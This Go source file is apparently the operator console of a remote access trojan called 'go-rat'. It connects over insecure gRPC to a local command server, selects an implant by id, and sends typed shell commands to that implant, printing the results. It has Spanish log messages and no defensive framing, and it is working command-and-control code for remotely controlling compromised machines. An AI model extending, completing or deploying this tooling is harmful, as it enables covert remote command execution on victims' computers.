package main

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"strings"

	"github.com/charmbracelet/lipgloss"
	"github.com/charmbracelet/log"
	"github.com/iortego42/go-rat/grpcapi"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

var PROMPT = lipgloss.NewStyle().
	SetString("> ").
	Foreground(lipgloss.Color("#9fe0f0"))

func mainLoop(client grpcapi.AdminClient) {
	var (
		ctx context.Context
		cmd *grpcapi.Command
		err error
	)
	ctx = context.Background()
	cmd = new(grpcapi.Command)

	id := os.Args[1]
	cmd.Id = id
	s := bufio.NewScanner(os.Stdin)
	for {
		cmd.Out = ""
		fmt.Print(PROMPT.Render())
		s.Scan()
		cmd.In = strings.Trim(s.Text(), " \n")
		if cmd.In == "exit" {
			fmt.Println(PROMPT.SetString("[+]").Render(), "Bye")
			return
		}
		cmd, err = client.RunCommand(ctx, cmd)
		if cmd == nil && err == nil {
			log.Info("Implant cerrado", "id", id)
			return
		}
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(cmd.Out)
	}
}

func main() {
	var (
		opts   []grpc.DialOption
		err    error
		conn   *grpc.ClientConn
		client grpcapi.AdminClient
	)
	opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
	conn, err = grpc.NewClient("127.0.0.1:9090", opts...)
	if err != nil {
		log.Fatal("[!] No se pudo establecer conexión con el servidor principal.", "ERROR", err)
	}
	defer conn.Close()
	client = grpcapi.NewAdminClient(conn)
	implantsMenu(client)
	mainLoop(client)
}
